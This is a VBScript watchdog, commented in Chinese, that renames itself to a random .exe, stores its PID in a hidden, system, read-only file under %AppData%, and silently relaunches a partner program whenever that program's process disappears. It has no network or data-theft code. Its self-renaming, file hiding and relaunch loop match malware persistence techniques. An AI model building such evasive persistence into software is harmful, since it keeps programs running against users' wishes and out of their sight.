REM 强制变量声明
Option Explicit
On Error Resume Next
REM 变量定义：
	REM Wsh Wscript.Shell
	REM FSO Scripting.FileSystemObject
	REM Wmi WMI命名空间连接
	REM AppDataPath 系统变量%AppData%路径
	REM SafePIDPath 监视程序(此程序)PID写入路径
	REM DelayTime 等待时间
	REM RandomName 随机文件名
	REM CheckName 文件验证依据 firstrun.ini
Dim Wsh,FSO,Wmi,AppDataPath,SafePIDPath,DelayTime,WmiList,oExec,strText,RandomName,CheckName,MyName,WmilistX,WmilistY
REM 等待时间定义
DelayTime=1000*5
Set Wsh=CreateObject("Wscript.Shell")
Set FSO=CreateObject("Scripting.FileSystemObject")
Set Wmi=GetObject("winmgmts:")
CheckName="firstrun.ini"
REM 赋值变量AppDataPaht为系统变量%appdata%内容
AppDataPath=Wsh.expandenvironmentstrings("%AppData%")
REM 运行环境检查
If FSO.FileExists(AppdataPath&"\con\.fms") Then Wscript.Quit
REM 首次运行自身名称更改
If Not FSO.FileExists(CheckName) Then
	MyName=FSO.GetFileName(Wscript.ScriptFullName)
	RandomName=genStr(6,9)&".exe"
	FSO.CopyFile MyName,RandomName,true
	FSO.OpenTextFile(CheckName,2,true).WriteLine(MyName)
	WSH.Exec(RandomName)
	Wscript.Quit
Else
	RandomName=FSO.OpenTextFile(CheckName,1).ReadLine
	If FSO.FileExists(RandomName) then FSO.DeleteFile RandomName,true
	If FSO.FileExists(CheckName) then FSO.DeleteFile CheckName,true
	MyName=FSO.GetFileName(Wscript.ScriptFullName)
End If
REM 获取保护pid文件是否存在
Do
	If FSO.FileExists(AppdataPath&"\fms3.fms") Then Exit Do
	Wscript.Sleep 1000
Loop
REM 检查安全打开文件是否存在
Do
	If FSO.FileExists(AppdataPath&"\fms4.fms") Then
		Exit Do
	End If
	Wscript.Sleep 1000
Loop
REM 获取并赋值变量SafePIDPath
SafePIDPath=AppdataPath&"\fms5.fms"
REM 查看是否已有实例运行
If FSO.FileExists(SafePIDPath) Then 
	If PIDCheck(FSO.OpenTextFile(SafePIDPath,1).ReadLine) Then Wscript.Quit
End If
REM 获取当前进程的PID并写入到fms5.fms
Set WmiListX=Wmi.ExecQuery("Select * From Win32_Process Where Name='"&MyName&"'")
For Each WmilistY In WmilistX
	REM 取消fms5.fms文件属性
	If FSO.FileExists(AppDataPath&"\fms5.fms") Then FSO.GetFile(AppDataPath&"\fms5.fms").attributes=32
	REM 将本程序PID写入fms5.fms
	FSO.OpenTextFile(AppDataPath&"\fms5.fms",2,true).WriteLine(WmilistY.Handle)
	REM 增加fms5.fms文件属性
	FSO.GetFile(AppDataPath&"\fms5.fms").attributes=32+4+2+1
Next

Do
	REM 检测AppDataPath\con\.fms是否存在，是则退出
	If FSO.FileExists(AppdataPath&"\con\.fms") Then Wscript.Quit
	REM 查看并检测PID是否存在并作出运行动作
	If Not PIDCheck(FSO.OpenTextFile(AppDataPath&"\fms3.fms",1).ReadLine) Then
		If FSO.FileExists(FSO.OpenTextFile(AppDataPath&"\fms4.fms",1).ReadLine) Then
			Wsh.RUN "cmd /c start """" "&""""&FSO.OpenTextFile(AppDataPath&"\fms4.fms",1).ReadLine&"""",0
			Wscript.Sleep 10*1000
		End If
	End If
	REM 延时Time秒
	Wscript.Sleep DelayTime
Loop

REM 检测PID是否存在
Private Function PIDCheck(PIDName)
	Set WmiList=Wmi.ExecQuery("Select * From Win32_Process Where Handle='"&PIDName&"'")
	PIDCheck=(WmiList.Count<>0)
End Function

REM 随机字符生成
Function randNum(lowerbound, upperbound)
    Randomize Time()
    randNum =  Int((upperbound - lowerbound + 1) * Rnd + lowerbound)
End Function
Function genStr(n, m)
    Dim a, z, s, i, p, k
    Dim arr()
    For i = 0 To 9
        ReDim Preserve arr(i)
        arr(i) = Chr(Asc("0") + i)
    Next
    k = UBound(arr)
    For i = 0 To 25
        Redim Preserve arr(k+1+i)
        arr(k+1+i) = Chr(Asc("a") + i)
    Next
    k = UBound(arr)
    For i = 0 To 25
        Redim Preserve arr(k+1+i)
        arr(k+1+i) = Chr(Asc("A") + i)
    Next
    a = 0
    z = UBound(arr)
    s = ""
    p = randNum(n, m)
    For i = 1 To p
        s = s & arr(randNum(a, z))
    Next
    genStr = s
End Function
